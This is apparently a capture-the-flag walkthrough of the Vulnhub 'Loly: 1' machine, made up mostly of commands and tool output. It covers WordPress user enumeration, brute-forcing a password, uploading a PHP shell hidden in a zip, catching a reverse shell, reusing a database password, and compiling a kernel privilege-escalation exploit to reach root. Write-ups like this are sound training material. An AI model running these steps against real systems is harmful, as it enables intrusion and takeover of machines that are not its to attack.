# Vulnhub > Loly: 1

* Name: Loly: 1
* Date release: 21 Aug 2020
* Author: SunCSR Team
* Series: Loly
* Difficulty: Easy
* Tested: VMware Workstation 15.x Pro (This works better with VMware rather than VirtualBox)
* Goal: Get the root shell.

# Services enumeration

Nmap (even with a full scan) only discovered 1 running web service.

~~~
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

# Web enumeration

There is no `robots.txt` file that may have disclosed hidden locations, but `gobuster` discovered a hidden `/wordpress` location:

~~~
$ gobuster dir -u http://loly.box -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://loly.box
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/21 15:03:05 Starting gobuster
===============================================================
/wordpress (Status: 301)
===============================================================
2020/09/21 15:03:05 Finished
===============================================================
~~~

# Wordpress

## loly.lc domain

The analysis of the source code reveals a the requests are expected to be sent to the domain name: `loly.lc`.

~~~
<link rel='dns-prefetch' href='//loly.lc' />
~~~

Let's add it to our `/etc/hosts` file:

~~~
$ echo "172.16.222.134 loly.lc" | sudo tee -a /etc/hosts
~~~

## Enumerate Wordpress users

Let's use `wpscan` to to enumerate the wordpress users:

~~~
kali@kali:/data/CHERRY_1/files/piranha.core-master$ wpscan --url http://loly.lc/wordpress/ -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://loly.lc/wordpress/ [172.16.222.134]
[+] Started: Mon Sep 21 15:08:28 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.10.3 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://loly.lc/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://loly.lc/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://loly.lc/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5 identified (Insecure, released on 2020-08-11).
 | Found By: Rss Generator (Passive Detection)
 |  - http://loly.lc/wordpress/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.5</generator>
 | Confirmed By: Emoji Settings (Passive Detection)
 |  - http://loly.lc/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.5'

[+] WordPress theme in use: feminine-style
 | Location: http://loly.lc/wordpress/wp-content/themes/feminine-style/
 | Last Updated: 2019-10-17T00:00:00.000Z
 | Readme: http://loly.lc/wordpress/wp-content/themes/feminine-style/readme.txt
 | [!] The version is out of date, the latest version is 2.0.0
 | Style URL: http://loly.lc/wordpress/wp-content/themes/feminine-style/style.css?ver=5.5
 | Style Name: Feminine Style
 | Style URI: https://www.acmethemes.com/themes/feminine-style
 | Description: Feminine Style is a voguish, dazzling and very appealing WordPress theme. The theme is completely wo...
 | Author: acmethemes
 | Author URI: https://www.acmethemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://loly.lc/wordpress/wp-content/themes/feminine-style/style.css?ver=5.5, Match: 'Version: 1.0.0'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=======================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] loly
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] A WordPress Commenter
 | Found By: Rss Generator (Passive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Mon Sep 21 15:08:31 2020
[+] Requests Done: 62
[+] Cached Requests: 7
[+] Data Sent: 13.571 KB
[+] Data Received: 12.945 MB
[+] Memory used: 176.711 MB
[+] Elapsed time: 00:00:02
kali@kali:/data/CHERRY_1/files/piranha.core-master$ wpscan --url http://loly.lc/
~~~

## Brute force loly's password

We have found that `loly` is a user. Let's brute force loly's account:

~~~
kali@kali:/data/CHERRY_1/files/piranha.core-master$ wpscan --url http://loly.lc/wordpress/ -U loly -P /usr/share/wordlists/rockyou.txt 

[REDACTED]

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - loly / fernando                                                                                          
Trying loly / corazon Time: 00:00:01 <                                       > (175 / 14344567)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: loly, Password: fernando

[REDACTED]
~~~

## wp-admin interface

We can now authenticate against the admin interface (http://loly.lc/wordpress/wp-admin/) with `loly:fernando`.

We can't modify the themes' PHP pages, nor the plugins' code, but there is a "AdRotate" plugin already installed which allows to upload banners on the target.

The upload form checks the file extension (and expects images), and we are not allowed to upload `*.php` files. However, we can upload a compressed archive (`*.zip`) which will successfully be unzipped on the target.

# Reverse shell

Start a listener (`rlwrap nc -nlvp 4444`) and browse the following URL:

~~~
$ curl loly.lc/wordpress/wp-content/banners/revshell.php
~~~ 

A reverse shell will be spawned to the listener window:

~~~
kali@kali:/data/Loly_1/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.16.222.128] from (UNKNOWN) [172.16.222.134] 36672
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
 06:38:11 up  1:10,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

# Lateral move (www-data->loly)

The Wordpress configuration file is interesting because it discloses the database connection details.

~~~
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@ubuntu:/$ cat /var/www/html/wordpress/wp-config.php
cat /var/www/html/wordpress/wp-config.php

[REDACTED]

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'lolyisabeautifulgirl' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

[REDACTED]
~~~

It is fair enough to assume that `loly`'s password could be the same as the database's password. It works, we are now connected as `loly`:

~~~
www-data@ubuntu:~/html/wordpress$ su loly
su loly
Password: lolyisabeautifulgirl

loly@ubuntu:/var/www/html/wordpress$ id
id
uid=1000(loly) gid=1000(loly) groups=1000(loly),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
~~~

# Privilege escalation

## Find an exploit

Running `linpeas.sh` on the target will reveal an outdated and vulnerable Linux version:

~~~
$ uname -a
Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
~~~

Searching for exploits affecting Ubuntu 16.04 reveals several vulnerabilities:

~~~
kali@kali:~/Downloads$ searchsploit ubuntu 16.04
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Apport 2.x (Ubuntu Desktop 12.10 < 16.04) - Local Code Execution                   | linux/local/40937.txt
Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                      | linux/local/40054.c
Google Chrome (Fedora 25 / Ubuntu 16.04) - 'tracker-extract' / 'gnome-video-thumbn | linux/local/40943.txt
LightDM (Ubuntu 16.04/16.10) - 'Guest Account' Local Privilege Escalation          | linux/local/41923.txt
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / C | linux_x86-64/local/42275.c
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'lds | linux_x86/local/42276.c
Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps              | linux/dos/39773.txt
Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR & SMEP Bypass) Arbitrary Fi | linux/local/45175.c
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)    | linux/local/40759.rb
Linux Kernel 4.4 (Ubuntu 16.04) - 'snd_timer_user_ccallback()' Kernel Pointer Leak | linux/dos/46529.c
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privil | linux_x86-64/local/40871.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds | linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condi | windows_x86-64/local/47170.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege  | linux/local/39772.txt
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Privilege Escala | linux/local/40489.txt
Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                         | linux/dos/45919.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation      | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation             | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privi | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escala | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Lo | linux/local/47169.c
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
~~~

Filtering the Privilege Escalation exploits highlights an interesting exploit. Let's download it:

~~~
kali@kali:/data/Loly_1/files$ searchsploit -m 45010
  Exploit: Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/45010
     Path: /usr/share/exploitdb/exploits/linux/local/45010.c
File Type: C source, ASCII text, with CRLF line terminators

Copied to: /data/Loly_1/files/45010.c
~~~

## Exploit the target

Transfer it to the target, compile it and run it:

~~~
www-data@ubuntu:/tmp$ su loly
su loly
Password: lolyisabeautifulgirl

loly@ubuntu:/tmp$ gcc -o root 45010.c
gcc -o root 45010.c
loly@ubuntu:/tmp$ ls -la
ls -la
total 400
drwxrwxrwt 11 root     root       4096 Sep 21 07:10 .
drwxr-xr-x 22 root     root       4096 Aug 19 00:02 ..
drwxr-xr-x  2 www-data www-data   4096 Oct 10  2016 40489
-rw-rw-rw-  1 www-data www-data  87759 Sep 21 06:56 40489.zip
-rw-rw-rw-  1 www-data www-data  13728 Sep 21 07:01 45010.c
drwxrwxrwt  2 root     root       4096 Sep 21  2020 .font-unix
drwxrwxrwt  2 root     root       4096 Sep 21  2020 .ICE-unix
-rwxrwxrwx  1 www-data www-data 226759 Aug 22 23:08 linpeas.sh
-rw-------  1 www-data www-data   5496 Sep 21 06:36 phpTf9lYM
-rwxrwxr-x  1 loly     loly      18432 Sep 21 07:09 root
drwx------  3 root     root       4096 Sep 21  2020 systemd-private-91b68af7597d42d99a7a33c087670e8e-systemd-timesyncd.service-4PKojL
drwxrwxrwt  2 root     root       4096 Sep 21  2020 .Test-unix
drwxrwxrwt  2 root     root       4096 Sep 21  2020 VMwareDnD
drwx------  2 root     root       4096 Sep 21  2020 vmware-root
drwxrwxrwt  2 root     root       4096 Sep 21  2020 .X11-unix
drwxrwxrwt  2 root     root       4096 Sep 21  2020 .XIM-unix
loly@ubuntu:/tmp$ ./root
./root
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff8800744c2500
[*] Leaking sock struct from ffff880078a530c0
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880078bd7680
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff880078bd7680
[*] credentials patched, launching shell...
# id
id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(loly)
~~~

# Root flag

~~~
# cd /root
cd /root
# ls -la
ls -la
total 28
drwx------  2 root root 4096 Aug 20 19:00 .
drwxr-xr-x 22 root root 4096 Aug 19 00:02 ..
-rw-------  1 root root 1589 Aug 20 19:01 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root  266 Aug 19 17:26 root.txt
-rw-r--r--  1 root root   75 Aug 20 18:52 .selected_editor
# cat root.txt
cat root.txt
  ____               ____ ____  ____  
 / ___| _   _ _ __  / ___/ ___||  _ \ 
 \___ \| | | | '_ \| |   \___ \| |_) |
  ___) | |_| | | | | |___ ___) |  _ < 
 |____/ \__,_|_| |_|\____|____/|_| \_\
                                      
Congratulations. I'm BigCityBoy
~~~

